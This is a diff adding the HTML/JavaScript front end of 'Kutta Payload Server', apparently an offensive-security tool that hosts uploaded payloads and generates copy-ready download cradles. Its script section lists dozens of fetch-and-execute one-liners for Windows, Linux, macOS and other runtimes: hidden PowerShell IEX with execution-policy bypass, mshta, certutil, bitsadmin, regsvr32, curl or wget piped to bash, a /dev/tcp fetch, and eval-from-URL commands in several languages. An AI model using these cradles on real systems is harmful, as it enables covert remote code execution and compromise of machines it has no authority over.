@@ -1,0 +1,1121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kutta Payload Server</title>
+  <link rel="stylesheet" href="../static/style.css">
+  <style>
+    /* ==================== ADDITIONAL STYLES ==================== */
+    
+    /* Toast Notifications */
+    .toast-container {
+      position: fixed;
+      bottom: 1.5rem;
+      right: 1.5rem;
+      z-index: 1000;
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+    }
+
+    .toast {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      padding: 0.75rem 1rem;
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+      animation: toastIn 0.3s ease;
+      min-width: 280px;
+      max-width: 400px;
+    }
+
+    .toast.removing {
+      animation: toastOut 0.3s ease forwards;
+    }
+
+    .toast.success { border-left: 3px solid #238636; }
+    .toast.error { border-left: 3px solid #f85149; }
+    .toast.info { border-left: 3px solid #58a6ff; }
+
+    @keyframes toastIn {
+      from { opacity: 0; transform: translateX(100%); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+
+    @keyframes toastOut {
+      from { opacity: 1; transform: translateX(0); }
+      to { opacity: 0; transform: translateX(100%); }
+    }
+
+    .toast-icon {
+      font-size: 1.2rem;
+      flex-shrink: 0;
+    }
+
+    .toast.success .toast-icon { color: #238636; }
+    .toast.error .toast-icon { color: #f85149; }
+    .toast.info .toast-icon { color: #58a6ff; }
+
+    .toast-message {
+      flex: 1;
+      font-size: 0.85rem;
+    }
+
+    .toast-close {
+      background: none;
+      border: none;
+      color: #8b949e;
+      cursor: pointer;
+      padding: 0.25rem;
+      font-size: 1rem;
+      line-height: 1;
+    }
+
+    .toast-close:hover {
+      color: #c9d1d9;
+    }
+
+    /* Upload Progress */
+    .upload-progress {
+      display: none;
+      margin: 0.5rem 0;
+      padding: 0.75rem;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 4px;
+    }
+
+    .upload-progress.active {
+      display: block;
+    }
+
+    .progress-bar {
+      height: 6px;
+      background: #21262d;
+      border-radius: 3px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #238636, #2ea043);
+      border-radius: 3px;
+      transition: width 0.2s ease;
+      width: 0%;
+    }
+
+    .progress-text {
+      font-size: 0.75rem;
+      color: #8b949e;
+      margin-top: 0.5rem;
+      text-align: center;
+    }
+
+    /* File Icons */
+    .file-icon {
+      display: inline-block;
+      width: 20px;
+      text-align: center;
+      margin-right: 0.25rem;
+    }
+
+    /* Cradle Tabs */
+    .cradle-tabs {
+      display: flex;
+      gap: 0.25rem;
+      margin-bottom: 1rem;
+      background: #0d1117;
+      padding: 0.25rem;
+      border-radius: 4px;
+      border: 1px solid #30363d;
+    }
+
+    .cradle-tab {
+      flex: 1;
+      padding: 0.5rem 1rem;
+      background: transparent;
+      border: none;
+      border-radius: 3px;
+      color: #8b949e;
+      font-family: monospace;
+      font-size: 0.85rem;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .cradle-tab:hover {
+      color: #c9d1d9;
+    }
+
+    .cradle-tab.active {
+      background: #21262d;
+      color: #c9d1d9;
+    }
+
+    .cradle-content {
+      display: none;
+    }
+
+    .cradle-content.active {
+      display: block;
+    }
+
+    .cradle-box {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      padding: 0.75rem;
+      margin-bottom: 0.75rem;
+      border-radius: 6px;
+    }
+
+    .cradle-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 0.5rem;
+    }
+
+    .cradle-title {
+      font-size: 0.8rem;
+      color: #8b949e;
+      font-weight: bold;
+    }
+
+    .cradle-box textarea {
+      width: 100%;
+      background: #161b22;
+      border: 1px solid #30363d;
+      color: #7ee787;
+      padding: 0.5rem;
+      border-radius: 4px;
+      resize: none;
+      font-family: monospace;
+      font-size: 0.75rem;
+      line-height: 1.5;
+    }
+
+    .copy-btn {
+      background: #238636;
+      border: none;
+      padding: 0.3rem 0.6rem;
+      border-radius: 4px;
+      color: white;
+      cursor: pointer;
+      font-size: 0.75rem;
+      font-family: monospace;
+      transition: all 0.2s ease;
+    }
+
+    .copy-btn:hover {
+      background: #2ea043;
+    }
+
+    .copy-btn.copied {
+      background: #1f6feb;
+    }
+
+    /* Cradle Panel Animation */
+    #cradlePanel {
+      transition: all 0.3s ease;
+    }
+
+    #cradlePanel.active {
+      display: block;
+      animation: slideDown 0.3s ease;
+    }
+
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Cradle filename display */
+    .cradle-filename {
+      color: #58a6ff;
+      font-size: 0.9rem;
+      margin-left: 0.5rem;
+      font-weight: normal;
+    }
+
+    /* Clipboard item styling */
+    .clipboard-item {
+      padding: 0.5rem;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 4px;
+      margin-bottom: 0.5rem;
+      word-break: break-all;
+    }
+
+    .clipboard-item-text {
+      color: #c9d1d9;
+    }
+
+    .clipboard-item-time {
+      display: block;
+      font-size: 0.7rem;
+      color: #6e7681;
+      margin-top: 0.25rem;
+    }
+
+    .clipboard-empty {
+      color: #6e7681;
+      text-align: center;
+      padding: 1rem;
+      font-style: italic;
+    }
+
+    /* Action buttons in table */
+    .action-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0.25rem;
+      font-size: 1rem;
+      opacity: 0.7;
+      transition: opacity 0.2s ease;
+    }
+
+    .action-btn:hover {
+      opacity: 1;
+    }
+
+    .action-btn.delete:hover {
+      color: #f85149;
+    }
+
+    /* Server status indicator */
+    .server-status {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.4rem 0.8rem;
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 4px;
+      font-size: 0.8rem;
+    }
+
+    .status-dot {
+      width: 8px;
+      height: 8px;
+      background: #238636;
+      border-radius: 50%;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    /* Responsive improvements */
+    @media (max-width: 900px) {
+      .main-grid {
+        flex-direction: column;
+      }
+      
+      .panel {
+        flex: 1 1 auto;
+        min-width: auto;
+      }
+
+      .topbar {
+        flex-direction: column;
+        gap: 0.75rem;
+        text-align: center;
+      }
+
+      .upload-actions {
+        flex-wrap: wrap;
+      }
+
+      .cradle-tabs {
+        flex-wrap: wrap;
+      }
+    }
+
+    /* Button improvements */
+    .button {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.3rem;
+      transition: all 0.2s ease;
+    }
+
+    .button:hover {
+      opacity: 0.9;
+      transform: translateY(-1px);
+    }
+
+    .button:active {
+      transform: translateY(0);
+    }
+
+    .button.success {
+      background-color: #238636;
+    }
+
+    /* Dropzone improvements */
+    .dropzone {
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .dropzone:hover {
+      border-color: #58a6ff;
+      background-color: rgba(88, 166, 255, 0.05);
+    }
+
+    .dropzone-icon {
+      font-size: 2rem;
+      margin-bottom: 0.5rem;
+    }
+
+    /* Close button for cradle panel */
+    .panel-close {
+      background: none;
+      border: none;
+      color: #8b949e;
+      cursor: pointer;
+      font-size: 1.2rem;
+      padding: 0.25rem 0.5rem;
+      border-radius: 4px;
+      transition: all 0.2s ease;
+    }
+
+    .panel-close:hover {
+      background: #21262d;
+      color: #c9d1d9;
+    }
+
+    /* Download counter badge (for future use) */
+    .download-badge {
+      display: inline-block;
+      padding: 0.1rem 0.4rem;
+      background: #21262d;
+      border-radius: 10px;
+      font-size: 0.7rem;
+      color: #8b949e;
+      margin-left: 0.5rem;
+    }
+
+    /* Confirmation modal */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 999;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    .modal {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 1.5rem;
+      max-width: 400px;
+      width: 90%;
+      animation: modalIn 0.2s ease;
+    }
+
+    @keyframes modalIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .modal-title {
+      font-size: 1.1rem;
+      margin-bottom: 0.75rem;
+      color: #c9d1d9;
+    }
+
+    .modal-message {
+      color: #8b949e;
+      margin-bottom: 1.25rem;
+      font-size: 0.9rem;
+    }
+
+    .modal-actions {
+      display: flex;
+      gap: 0.5rem;
+      justify-content: flex-end;
+    }
+  </style>
+</head>
+<body>
+  <!-- Toast Container -->
+  <div class="toast-container" id="toastContainer"></div>
+
+  <!-- Confirmation Modal -->
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal">
+      <div class="modal-title" id="modalTitle">Confirm Action</div>
+      <div class="modal-message" id="modalMessage">Are you sure?</div>
+      <div class="modal-actions">
+        <button class="button" id="modalCancel" style="background: #21262d;">Cancel</button>
+        <button class="button danger" id="modalConfirm">Confirm</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Header -->
+  <header class="topbar">
+    <div class="branding" style="display: flex; align-items: center; gap: 10px;">
+      <img src="../static/kutta-logo.png" alt="Kutta Logo" width="100" height="83">
+      <div>
+        <div class="logo-title" style="font-size: 3.2rem; font-weight: bold;">Kutta</div>
+      </div> 
+    </div>
+    <p style="font-size: 1.8rem; margin: 0;">Upload and share payloads</p>
+    <div style="display: flex; align-items: center; gap: 1rem;">
+      <div class="server-status">
+        <span class="status-dot"></span>
+        <span id="serverAddrDisplay">{{.ServerAddr}}</span>
+      </div>
+      <div class="directory">Directory: {{.RelPath}}</div>
+    </div>
+  </header>
+
+  <main class="main-grid">
+    <!-- Files Panel -->
+    <section class="panel">
+      <h2>📁 Upload File</h2>
+      
+      <!-- Dropzone -->
+      <div id="dropZone" class="dropzone">
+        <div class="dropzone-icon">📤</div>
+        <div>Drag & Drop files here or click to select</div>
+        <small style="color: #6e7681;">Any file type supported</small>
+        <input type="file" id="fileInput" style="display:none" multiple />
+      </div>
+
+      <!-- Upload Progress -->
+      <div class="upload-progress" id="uploadProgress">
+        <div class="progress-bar">
+          <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="progress-text" id="progressText">Uploading...</div>
+      </div>
+
+      <!-- Toolbar -->
+      <div class="upload-actions">
+        <button id="selectAll" class="button">☑️ Select All</button>
+        <button id="selectNone" class="button">⬜ Select None</button>
+        <button id="generateCradles" class="button" style="background: #238636;">⚡ Generate Cradles</button>
+        <button id="bulkDeleteBtn" class="button danger">🗑️ Delete Selected</button>
+        <label for="searchBox">🔍</label>
+        <input type="text" id="searchBox" class="search" placeholder="Filter files..." style="flex: 1; min-width: 150px;">
+      </div>
+
+      <!-- File Table -->
+      <form method="POST" action="/bulkdelete" id="bulkDeleteForm">
+        <table class="filetable">
+          <thead>
+            <tr>
+              <th style="width: 30px;"></th>
+              <th>Name</th>
+              <th>Size</th>
+              <th>Last Modified</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+          <tbody id="fileTable">
+            {{if .ParentPath}}
+            <tr style="background: #21262d;">
+              <td></td>
+              <td colspan="4">⬅️ <a href="/{{.ParentPath}}">Parent Directory</a></td>
+            </tr>
+            {{end}}
+
+            {{range .Files}}
+            <tr data-filename="{{.Name}}">
+              <td><input type="checkbox" name="files" value="{{$.RelPath}}/{{.Name}}"></td>
+              <td>
+                {{if .IsDir}}
+                  <span class="file-icon">📂</span>
+                  <a href="/{{$.RelPath}}/{{.Name}}">{{.Name}}</a>
+                {{else}}
+                  <span class="file-icon" data-ext="{{.Name}}">{{.Icon}}</span>
+                  <a href="/files/{{$.RelPath}}/{{.Name}}" target="_blank">{{.Name}}</a>
+                {{end}}
+              </td>
+              <td>{{.Size}}</td>
+              <td>{{.ModTime}}</td>
+              <td>
+                {{if not .IsDir}}
+                  <a href="/files/{{$.RelPath}}/{{.Name}}" title="Download" download>⬇️</a>
+                  <button type="button" class="action-btn delete" title="Delete" onclick="confirmDelete('{{$.RelPath}}/{{.Name}}')">🗑️</button>
+                {{end}}
+              </td>
+            </tr>
+            {{end}}
+          </tbody>
+        </table>
+      </form>
+
+      <!-- Cradle Generator Panel -->
+      <section class="panel" id="cradlePanel" style="display:none; margin-top: 1rem;">
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+          <h2>⚡ Cradle Generator <span class="cradle-filename" id="cradleFilename"></span></h2>
+          <button class="panel-close" onclick="closeCradlePanel()">✕</button>
+        </div>
+        
+        <div class="cradle-tabs">
+          <button class="cradle-tab active" data-tab="windows">🪟 Windows</button>
+          <button class="cradle-tab" data-tab="linux">🐧 Linux</button>
+          <button class="cradle-tab" data-tab="macos">🍎 macOS</button>
+          <button class="cradle-tab" data-tab="other">🔧 Other</button>
+        </div>
+
+        <div class="cradle-content active" id="windows-cradles"></div>
+        <div class="cradle-content" id="linux-cradles"></div>
+        <div class="cradle-content" id="macos-cradles"></div>
+        <div class="cradle-content" id="other-cradles"></div>
+      </section>
+    </section>
+
+    <!-- Clipboard Panel -->
+    <section class="panel">
+      <h2>📋 Clipboard</h2>
+      <textarea id="clipboardInput" class="clipboard-input" placeholder="Type or paste text and press Add..."></textarea>
+      <div class="clipboard-actions">
+        <button id="addClipboard" class="button success">➕ Add</button>
+        <button id="exportClipboard" class="button">💾 Export</button>
+        <button id="clearClipboard" class="button danger">🧹 Clear All</button>
+      </div>
+      <div id="clipboardList" class="clipboard-list"></div>
+    </section>
+  </main>
+
+  <footer class="bottombar">
+    <span>📊 {{len .Files}} items</span>
+    <span class="version">kutta v1.0.1 | <a href="https://breachsimrange.io" style="color: #58a6ff;">breachsimrange.io</a></span>
+  </footer>
+
+  <script>
+    const SERVER_ADDR = "{{.ServerAddr}}";
+
+    // ==================== TOAST NOTIFICATIONS ====================
+    function showToast(message, type = 'info') {
+      const container = document.getElementById('toastContainer');
+      const toast = document.createElement('div');
+      toast.className = `toast ${type}`;
+      
+      const icons = { success: '✅', error: '❌', info: 'ℹ️' };
+
+      toast.innerHTML = `
+        <span class="toast-icon">${icons[type]}</span>
+        <span class="toast-message">${message}</span>
+        <button class="toast-close" onclick="this.parentElement.remove()">✕</button>
+      `;
+      
+      container.appendChild(toast);
+      setTimeout(() => {
+        toast.classList.add('removing');
+        setTimeout(() => toast.remove(), 300);
+      }, 4000);
+    }
+
+    // ==================== MODAL CONFIRMATION ====================
+    let modalCallback = null;
+
+    function showModal(title, message, onConfirm) {
+      document.getElementById('modalTitle').textContent = title;
+      document.getElementById('modalMessage').textContent = message;
+      document.getElementById('modalOverlay').classList.add('active');
+      modalCallback = onConfirm;
+    }
+
+    function hideModal() {
+      document.getElementById('modalOverlay').classList.remove('active');
+      modalCallback = null;
+    }
+
+    document.getElementById('modalCancel').addEventListener('click', hideModal);
+    document.getElementById('modalConfirm').addEventListener('click', () => {
+      if (modalCallback) modalCallback();
+      hideModal();
+    });
+
+    document.getElementById('modalOverlay').addEventListener('click', (e) => {
+      if (e.target.id === 'modalOverlay') hideModal();
+    });
+
+    // ==================== FILE SELECTION ====================
+    document.getElementById('selectAll').addEventListener('click', (e) => {
+      e.preventDefault();
+      document.querySelectorAll('input[name="files"]').forEach(cb => cb.checked = true);
+      showToast('All files selected', 'info');
+    });
+
+    document.getElementById('selectNone').addEventListener('click', (e) => {
+      e.preventDefault();
+      document.querySelectorAll('input[name="files"]').forEach(cb => cb.checked = false);
+      showToast('Selection cleared', 'info');
+    });
+
+    // ==================== SEARCH ====================
+    let searchTimeout;
+    const searchBox = document.getElementById('searchBox');
+    
+    searchBox.addEventListener('input', function() {
+      clearTimeout(searchTimeout);
+      searchTimeout = setTimeout(() => {
+        const term = this.value.trim();
+        if (term) {
+          window.location.search = '?q=' + encodeURIComponent(term);
+        } else if (window.location.search) {
+          window.location.search = '';
+        }
+      }, 500);
+    });
+
+    // Also support local filtering without page reload
+    searchBox.addEventListener('keyup', function(e) {
+      if (e.key === 'Escape') {
+        this.value = '';
+        filterTable('');
+      }
+      // Only filter locally if user hasn't pressed Enter
+      if (e.key !== 'Enter') {
+        filterTable(this.value);
+      }
+    });
+
+    function filterTable(term) {
+      const rows = document.querySelectorAll('#fileTable tr[data-filename]');
+      const lowerTerm = term.toLowerCase();
+      
+      rows.forEach(row => {
+        const filename = row.dataset.filename.toLowerCase();
+        row.style.display = filename.includes(lowerTerm) ? '' : 'none';
+      });
+    }
+
+    // ==================== DROPZONE & UPLOAD ====================
+    const dropZone = document.getElementById('dropZone');
+    const fileInput = document.getElementById('fileInput');
+    const uploadProgress = document.getElementById('uploadProgress');
+    const progressFill = document.getElementById('progressFill');
+    const progressText = document.getElementById('progressText');
+
+    dropZone.addEventListener('click', () => fileInput.click());
+
+    dropZone.addEventListener('dragover', e => {
+      e.preventDefault();
+      dropZone.classList.add('dragover');
+    });
+
+    dropZone.addEventListener('dragleave', () => dropZone.classList.remove('dragover'));
+
+    dropZone.addEventListener('drop', e => {
+      e.preventDefault();
+      dropZone.classList.remove('dragover');
+      uploadFiles(e.dataTransfer.files);
+    });
+
+    fileInput.addEventListener('change', () => {
+      uploadFiles(fileInput.files);
+    });
+
+    function uploadFiles(files) {
+      if (files.length === 0) return;
+
+      const formData = new FormData();
+      let totalSize = 0;
+      
+      for (let i = 0; i < files.length; i++) {
+        formData.append('file', files[i]);
+        totalSize += files[i].size;
+      }
+
+      uploadProgress.classList.add('active');
+      progressFill.style.width = '0%';
+      progressText.textContent = `Uploading ${files.length} file(s) (${formatSize(totalSize)})...`;
+
+      const xhr = new XMLHttpRequest();
+      
+      xhr.upload.addEventListener('progress', (e) => {
+        if (e.lengthComputable) {
+          const percent = Math.round((e.loaded / e.total) * 100);
+          progressFill.style.width = percent + '%';
+          progressText.textContent = `Uploading... ${percent}% (${formatSize(e.loaded)} / ${formatSize(e.total)})`;
+        }
+      });
+
+      xhr.addEventListener('load', () => {
+        if (xhr.status === 200 || xhr.status === 303) {
+          progressFill.style.width = '100%';
+          progressFill.style.background = 'linear-gradient(90deg, #238636, #2ea043)';
+          progressText.textContent = '✅ Upload complete!';
+          showToast(`Successfully uploaded ${files.length} file(s)`, 'success');
+          setTimeout(() => location.reload(), 1000);
+        } else {
+          progressFill.style.background = '#f85149';
+          progressText.textContent = '❌ Upload failed';
+          showToast('Upload failed: ' + xhr.statusText, 'error');
+          setTimeout(() => uploadProgress.classList.remove('active'), 2000);
+        }
+      });
+
+      xhr.addEventListener('error', () => {
+        progressFill.style.background = '#f85149';
+        progressText.textContent = '❌ Upload failed';
+        showToast('Upload failed - network error', 'error');
+        setTimeout(() => uploadProgress.classList.remove('active'), 2000);
+      });
+
+      xhr.open('POST', '/upload');
+      xhr.send(formData);
+    }
+
+    function formatSize(bytes) {
+      if (bytes < 1024) return bytes + ' B';
+      if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
+      if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
+      return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' GB';
+    }
+
+    // ==================== DELETE ====================
+    function confirmDelete(file) {
+      showModal(
+        '🗑️ Delete File',
+        `Are you sure you want to delete "${file.split('/').pop()}"?`,
+        () => {
+          window.location.href = '/delete?file=' + encodeURIComponent(file);
+        }
+      );
+    }
+
+    document.getElementById('bulkDeleteBtn').addEventListener('click', (e) => {
+      e.preventDefault();
+      const selected = document.querySelectorAll('input[name="files"]:checked');
+      if (selected.length === 0) {
+        showToast('No files selected', 'error');
+        return;
+      }
+      
+      showModal(
+        '🗑️ Delete Multiple Files',
+        `Are you sure you want to delete ${selected.length} file(s)?`,
+        () => {
+          document.getElementById('bulkDeleteForm').submit();
+        }
+      );
+    });
+
+    // ==================== CLIPBOARD ====================
+    const clipboardInput = document.getElementById('clipboardInput');
+    const clipboardList = document.getElementById('clipboardList');
+
+    async function refreshClipboard() {
+      try {
+        const res = await fetch('/clipboard');
+        const entries = await res.json();
+        
+        if (!entries || entries.length === 0) {
+          clipboardList.innerHTML = '<div class="clipboard-empty">No clipboard entries yet</div>';
+          return;
+        }
+
+        clipboardList.innerHTML = entries.map(e => `
+          <div class="clipboard-item">
+            <div class="clipboard-item-text">${escapeHtml(e.text)}</div>
+            <span class="clipboard-item-time">${new Date(e.timestamp).toLocaleString()}</span>
+          </div>
+        `).join('');
+      } catch (err) {
+        console.error('Failed to fetch clipboard:', err);
+        clipboardList.innerHTML = '<div class="clipboard-empty">Failed to load clipboard</div>';
+      }
+    }
+
+    function escapeHtml(text) {
+      const div = document.createElement('div');
+      div.textContent = text;
+      return div.innerHTML;
+    }
+
+    document.getElementById('addClipboard').addEventListener('click', async () => {
+      const text = clipboardInput.value.trim();
+      if (!text) {
+        showToast('Please enter some text', 'error');
+        return;
+      }
+      
+      try {
+        await fetch('/clipboard', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({ text })
+        });
+        
+        clipboardInput.value = '';
+        await refreshClipboard();
+        showToast('Added to clipboard', 'success');
+      } catch (err) {
+        showToast('Failed to add to clipboard', 'error');
+      }
+    });
+
+    // Allow Ctrl+Enter to add clipboard
+    clipboardInput.addEventListener('keydown', (e) => {
+      if (e.ctrlKey && e.key === 'Enter') {
+        document.getElementById('addClipboard').click();
+      }
+    });
+
+    document.getElementById('exportClipboard').addEventListener('click', () => {
+      window.location = '/clipboard/export';
+      showToast('Exporting clipboard...', 'info');
+    });
+
+    document.getElementById('clearClipboard').addEventListener('click', () => {
+      showModal(
+        '🧹 Clear Clipboard',
+        'Are you sure you want to clear all clipboard entries?',
+        async () => {
+          await fetch('/clipboard/clear', { method: 'POST' });
+          clipboardList.innerHTML = '<div class="clipboard-empty">No clipboard entries yet</div>';
+          showToast('Clipboard cleared', 'success');
+        }
+      );
+    });
+
+    refreshClipboard();
+
+    // ==================== CRADLE GENERATOR ====================
+    const cradles = {
+      windows: [
+        {
+          caption: "PowerShell - WebClient + IEX",
+          command: `powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://IP/files/FILENAME')"`
+        },
+        {
+          caption: "PowerShell - iwr + iex (short)",
+          command: `powershell -nop -w hidden -c "iwr -UseBasicParsing http://IP/files/FILENAME | iex"`
+        },
+        {
+          caption: "PowerShell - Download to disk",
+          command: `powershell -c "Invoke-WebRequest -Uri 'http://IP/files/FILENAME' -OutFile '$env:TEMP\\FILENAME'; Start-Process '$env:TEMP\\FILENAME'"`
+        },
+        {
+          caption: "PowerShell - Bypass execution policy",
+          command: `powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://IP/files/FILENAME')"`
+        },
+        {
+          caption: "mshta - Run remote HTA/JS/VBS",
+          command: `mshta http://IP/files/FILENAME`
+        },
+        {
+          caption: "certutil - Download + execute",
+          command: `certutil -urlcache -split -f http://IP/files/FILENAME %TEMP%\\FILENAME && %TEMP%\\FILENAME`
+        },
+        {
+          caption: "bitsadmin - Download + execute",
+          command: `bitsadmin /transfer job /download /priority high http://IP/files/FILENAME %TEMP%\\FILENAME && %TEMP%\\FILENAME`
+        },
+        {
+          caption: "cmd - curl download (Win10+)",
+          command: `curl -o %TEMP%\\FILENAME http://IP/files/FILENAME && %TEMP%\\FILENAME`
+        },
+        {
+          caption: "regsvr32 - Run SCT file",
+          command: `regsvr32 /s /n /u /i:http://IP/files/FILENAME scrobj.dll`
+        }
+      ],
+      linux: [
+        {
+          caption: "curl + bash",
+          command: `curl -s http://IP/files/FILENAME | bash`
+        },
+        {
+          caption: "wget + bash",
+          command: `wget -qO- http://IP/files/FILENAME | bash`
+        },
+        {
+          caption: "curl - Download + chmod + exec",
+          command: `curl -o /tmp/FILENAME http://IP/files/FILENAME && chmod +x /tmp/FILENAME && /tmp/FILENAME`
+        },
+        {
+          caption: "wget - Download + chmod + exec",
+          command: `wget http://IP/files/FILENAME -O /tmp/FILENAME && chmod +x /tmp/FILENAME && /tmp/FILENAME`
+        },
+        {
+          caption: "curl + sh (POSIX)",
+          command: `curl -s http://IP/files/FILENAME | sh`
+        },
+        {
+          caption: "Python3 urllib",
+          command: `python3 -c "import urllib.request; exec(urllib.request.urlopen('http://IP/files/FILENAME').read())"`
+        },
+        {
+          caption: "Python3 - Download + exec",
+          command: `python3 -c "import urllib.request; urllib.request.urlretrieve('http://IP/files/FILENAME', '/tmp/FILENAME'); import os; os.chmod('/tmp/FILENAME', 0o755); os.system('/tmp/FILENAME')"`
+        },
+        {
+          caption: "Perl LWP",
+          command: `perl -e 'use LWP::Simple; eval(get("http://IP/files/FILENAME"))'`
+        },
+        {
+          caption: "Bash /dev/tcp (no curl/wget)",
+          command: `bash -c 'exec 3<>/dev/tcp/IP/80; echo -e "GET /files/FILENAME HTTP/1.1\\r\\nHost: IP\\r\\nConnection: close\\r\\n\\r\\n" >&3; cat <&3 | sed "1,/^\\r$/d" | bash'`
+        }
+      ],
+      macos: [
+        {
+          caption: "curl + bash",
+          command: `curl -s http://IP/files/FILENAME | bash`
+        },
+        {
+          caption: "curl - Download + chmod + exec",
+          command: `curl -o /tmp/FILENAME http://IP/files/FILENAME && chmod +x /tmp/FILENAME && /tmp/FILENAME`
+        },
+        {
+          caption: "osascript - Run AppleScript",
+          command: `osascript -e 'do shell script "curl -s http://IP/files/FILENAME | bash"'`
+        },
+        {
+          caption: "Python - urllib (macOS built-in)",
+          command: `python3 -c "import urllib.request; exec(urllib.request.urlopen('http://IP/files/FILENAME').read())"`
+        }
+      ],
+      other: [
+        {
+          caption: "Ruby - Download + exec",
+          command: `ruby -e "require 'open-uri'; eval(URI.open('http://IP/files/FILENAME').read)"`
+        },
+        {
+          caption: "PHP",
+          command: `php -r "eval(file_get_contents('http://IP/files/FILENAME'));"`
+        },
+        {
+          caption: "Node.js",
+          command: `node -e "require('http').get('http://IP/files/FILENAME', r => { let d=''; r.on('data', c => d+=c); r.on('end', () => eval(d)); })"`
+        },
+        {
+          caption: "Java (Nashorn - Java 8-14)",
+          command: `jjs -e "load('http://IP/files/FILENAME')"`
+        },
+        {
+          caption: "Go - Download + exec",
+          command: `go run <(curl -s http://IP/files/FILENAME)`
+        }
+      ]
+    };
+
+    // Tab switching
+    document.querySelectorAll('.cradle-tab').forEach(tab => {
+      tab.addEventListener('click', () => {
+        document.querySelectorAll('.cradle-tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.cradle-content').forEach(c => c.classList.remove('active'));
+        
+        tab.classList.add('active');
+        document.getElementById(tab.dataset.tab + '-cradles').classList.add('active');
+      });
+    });
+
+    function generateCradles(filename) {
+      const ip = SERVER_ADDR || window.location.host;
+      const panel = document.getElementById('cradlePanel');
+      
+      document.getElementById('cradleFilename').textContent = filename;
+
+      Object.keys(cradles).forEach(category => {
+        const container = document.getElementById(category + '-cradles');
+        container.innerHTML = '';
+
+        cradles[category].forEach(c => {
+          const updated = c.command
+            .replace(/IP/g, ip)
+            .replace(/FILENAME/g, filename);
+
+          const box = document.createElement('div');
+          box.className = 'cradle-box';
+          box.innerHTML = `
+            <div class="cradle-header">
+              <span class="cradle-title">${c.caption}</span>
+              <button class="copy-btn" onclick="copyToClipboard(this, \`${escapeForJs(updated)}\`)">📋 Copy</button>
+            </div>
+            <textarea rows="2" readonly onclick="this.select()">${updated}</textarea>
+          `;
+          container.appendChild(box);
+        });
+      });
+
+      panel.style.display = 'block';
+      panel.classList.add('active');
+      panel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      showToast(`Generated cradles for ${filename}`, 'success');
+    }
+
+    function closeCradlePanel() {
+      const panel = document.getElementById('cradlePanel');
+      panel.style.display = 'none';
+      panel.classList.remove('active');
+    }
+
+    function escapeForJs(str) {
+      return str.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$');
+    }
+
+    function copyToClipboard(btn, text) {
+      navigator.clipboard.writeText(text).then(() => {
+        const originalText = btn.innerHTML;
+        btn.innerHTML = '✅ Copied!';
+        btn.classList.add('copied');
+        showToast('Copied to clipboard', 'success');
+        setTimeout(() => {
+          btn.innerHTML = originalText;
+          btn.classList.remove('copied');
+        }, 2000);
+      }).catch(() => {
+        showToast('Failed to copy', 'error');
+      });
+    }
+
+    document.getElementById('generateCradles').addEventListener('click', () => {
+      const selected = document.querySelector('input[name="files"]:checked');
+      if (!selected) {
+        showToast('Please select a file first', 'error');
+        return;
+      }
+      const filename = selected.value.split("/").pop();
+      generateCradles(filename);
+    });
+
+    // ==================== KEYBOARD SHORTCUTS ====================
+    document.addEventListener('keydown', (e) => {
+      // Escape to close modal
+      if (e.key === 'Escape') {
+        hideModal();
+        closeCradlePanel();
+      }
+      
+      // Ctrl+A to select all files (when not in input)
+      if (e.ctrlKey && e.key === 'a' && document.activeElement.tagName !== 'INPUT' && document.activeElement.tagName !== 'TEXTAREA') {
+        e.preventDefault();
+        document.getElementById('selectAll').click();
+      }
+    });
+
+    // ==================== INITIALIZATION ====================
+    console.log('🚀 Kutta Payload Server loaded');
+    console.log(`📡 Server: ${SERVER_ADDR}`);
+  </script>
+</body>
+</html>
